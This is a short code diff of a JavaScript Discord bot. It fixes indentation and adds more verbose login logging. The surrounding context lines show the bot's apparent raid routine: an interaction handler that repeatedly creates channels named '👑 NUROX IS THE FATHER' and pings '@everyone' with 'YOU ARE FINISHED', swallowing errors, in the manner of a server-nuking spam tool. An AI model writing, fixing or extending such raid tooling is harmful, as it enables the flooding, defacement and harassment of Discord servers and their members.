@@ -479,7 +479,7 @@ client.on('interactionCreate', async (interaction) => {
         const channel = await interaction.guild.channels.create({ name: '👑 NUROX IS THE FATHER', type: 0 });
         await channel.send('@everyone YOU ARE FINISHED');
       } catch (err) {}
-        await new Promise(resolve => setTimeout(resolve, 500));
+      await new Promise(resolve => setTimeout(resolve, 500));
     }
   }
 
@@ -511,8 +511,10 @@ client.on('interactionCreate', async (interaction) => {
   }
 });
 
-// Logging and Initialization
-console.log('[Discord] Logging in with provided token...');
-client.login(BOT_TOKEN).catch(err => {
-  console.error('[Discord Error] Failed to log in:', err.message);
+// Logging and Initialization with Safety Catch
+console.log('[Discord] Attempting connection to Discord Gateway...');
+client.login(BOT_TOKEN).then(() => {
+  console.log('[Discord Success] Client login successful!');
+}).catch(err => {
+  console.error('[Discord Fatal Error] Failed to login to Discord:', err);
 });
